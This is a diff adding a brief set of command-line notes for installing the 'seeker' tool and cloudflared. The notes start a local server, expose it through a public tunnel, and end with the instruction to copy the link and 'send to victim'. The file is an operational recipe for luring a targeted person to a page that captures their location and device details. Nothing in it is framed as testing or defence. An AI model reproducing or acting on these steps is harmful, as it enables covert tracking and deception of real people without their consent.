@@ -1,0 +1,35 @@
+#Installation of seeker
+
+git clone https://github.com/thewhiteh4t/seeker.git
+
+cd seeker
+
+chmod +x install.sh
+
+./install.sh
+
+python3 seeker.py
+
+#cloud-flared downlaod
+
+https://github.com/cloudflare/cloudflared/releases/download/2023.7.1/cloudflared-linux-amd64.deb
+
+add terminal 
+
+wget https://github.com/cloudflare/cloudflared/releases/download/2023.7.1/cloudflared-linux-amd64.deb
+
+ls
+
+sudo dpkg -i cloudflared-linux-amd64.deb
+
+#on seeker - select template
+
+#on 2nd terminal
+
+sudo service apache2 start 
+
+cloudflared --url localhost:8080
+
+--copy link--
+
+send to victim
